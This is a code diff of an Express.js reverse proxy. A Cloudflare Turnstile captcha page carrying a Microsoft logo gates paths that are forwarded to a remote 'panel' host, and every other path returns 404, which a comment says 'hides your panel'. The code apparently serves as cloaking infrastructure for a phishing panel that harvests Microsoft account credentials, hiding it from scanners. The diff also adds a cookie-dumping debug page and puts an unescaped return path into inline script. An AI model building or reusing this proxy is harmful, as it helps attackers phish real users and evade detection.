@@ -6,11 +6,21 @@ const port = process.env.PORT || 3000;
 app.set('trust proxy', 1);
 
 const PANEL = 'portal42-343.sbs';
-const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm'; // Only site key needed
+const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cookieParser());
+
+// ---- DEBUG PAGE ----
+app.get('/debug', (req, res) => {
+    res.send(`
+        <h1>Debug</h1>
+        <p>Cookies: ${JSON.stringify(req.cookies)}</p>
+        <p>captcha_passed: ${req.cookies.captcha_passed ? 'YES' : 'NO'}</p>
+        <p><a href="/">Home</a></p>
+    `);
+});
 
 // ---- CAPTCHA PAGE ----
 app.get('/captcha', (req, res) => {
@@ -20,13 +30,14 @@ app.get('/captcha', (req, res) => {
     res.send(getCaptchaHTML(SITE_KEY, returnPath));
 });
 
-// ---- SET COOKIE ENDPOINT (No verification, just sets cookie and redirects) ----
+// ---- SET COOKIE AND REDIRECT ----
 app.get('/set-cookie', (req, res) => {
     const returnPath = req.query.return || '/';
+    // Set cookie with secure: false for Render compatibility
     res.cookie('captcha_passed', 'true', {
-        maxAge: 300000,
+        maxAge: 300000,          // 5 minutes
         httpOnly: true,
-        secure: false,
+        secure: false,           // CHANGE: false for Render
         sameSite: 'lax'
     });
     res.redirect(returnPath);
@@ -40,11 +51,13 @@ app.get('/device/*', (req, res) => {
     res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
 });
 
-// ---- PROXY ONLY FOR /l/ AND /device/ (with cookie check) ----
+// ---- PROXY ONLY FOR /l/ AND /device/ ----
 app.use('/l/*', async (req, res) => {
+    // Check cookie
     if (!req.cookies.captcha_passed) {
         return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
     }
+    // Proxy to panel
     try {
         const target = new URL(req.originalUrl, `https://${PANEL}`);
         const headers = new Headers(req.headers);
@@ -75,14 +88,14 @@ app.use('/device/*', async (req, res) => {
     }
 });
 
-// ---- ALL OTHER PATHS – 404 (hides your panel) ----
+// ---- ALL OTHER PATHS – 404 ----
 app.use('*', (req, res) => {
     res.status(404).send('Not Found');
 });
 
 app.listen(port, () => console.log('✅ Proxy running on port ' + port));
 
-// ---- CAPTCHA HTML (uses only site key) ----
+// ---- CAPTCHA HTML ----
 function getCaptchaHTML(siteKey, returnPath) {
     return `
 <!DOCTYPE html>
@@ -93,42 +106,33 @@ function getCaptchaHTML(siteKey, returnPath) {
   <title>Verify</title>
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
   <style>
-    /* Your existing CSS (keep as is) */
-    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: #f5f5f5; }
+    /* Keep your CSS here */
+    body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
     .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-    .error { color: #d32f2f; padding: 20px; background: #ffebee; border-radius: 4px; }
-    .loading { color: #1976d2; padding: 20px; }
     #cf-turnstile { display: flex; justify-content: center; margin: 20px 0; }
-    #dp { margin-top: 20px; }
-    /* Keep your logo animation styles here */
+    #dp { margin-top: 20px; color: #555; }
+    .error { color: #d32f2f; padding: 10px; background: #ffebee; border-radius: 4px; display: none; }
   </style>
 </head>
 <body>
   <div class="container">
-    <!-- Your full logo animation HTML (keep as is) -->
-    <div id="loadingLogo" dir="ltr"> ... </div>
+    <!-- Your logo animation HTML (keep as is) -->
+    <div id="loadingLogo"> ... </div>
     <div id="dp"></div>
     <div id="cf-turnstile"></div>
-    <div id="status"></div>
-    <img src="https://res.cdn.office.net/assets/framework/microsoft.svg" id="MSLogo" alt="MS">
+    <div id="status" class="error"></div>
   </div>
   <script>
     const returnPath = "${returnPath}";
-
-    // ---- MESSAGES ----
     const messages = ["Loading...", "Processing request...", "Preparing results...", "Almost there...", "Finalizing..."];
-    let index = 0;
-    function cycleMessages() {
-      document.getElementById("dp").textContent = messages[index];
-      index = (index + 1) % messages.length;
-    }
-    cycleMessages();
-    setInterval(cycleMessages, 3000);
+    let idx = 0;
+    const dp = document.getElementById('dp');
+    dp.textContent = messages[0];
+    setInterval(() => { dp.textContent = messages[idx]; idx = (idx+1)%messages.length; }, 3000);
 
-    // ---- TURNSTILE CALLBACK (redirects to set-cookie endpoint) ----
     function turnstileCallback(token) {
       if (token) {
-        // Redirect to /set-cookie which sets the cookie and then redirects to returnPath
+        // Redirect to /set-cookie which will set cookie and then go to returnPath
         window.location.href = '/set-cookie?return=' + encodeURIComponent(returnPath);
       }
     }
@@ -136,11 +140,10 @@ function getCaptchaHTML(siteKey, returnPath) {
     function turnstileErrorCallback() {
       document.getElementById('status').textContent = 'Error. Please refresh.';
       document.getElementById('status').style.display = 'block';
-      setTimeout(() => window.location.reload(), 1500);
     }
     function turnstileExpiredCallback() {
       if (window.turnstile) turnstile.reset();
-      document.getElementById('status').textContent = 'Expired. Please try again.';
+      document.getElementById('status').textContent = 'Expired. Try again.';
       document.getElementById('status').style.display = 'block';
     }
     function onTurnstileLoad() {
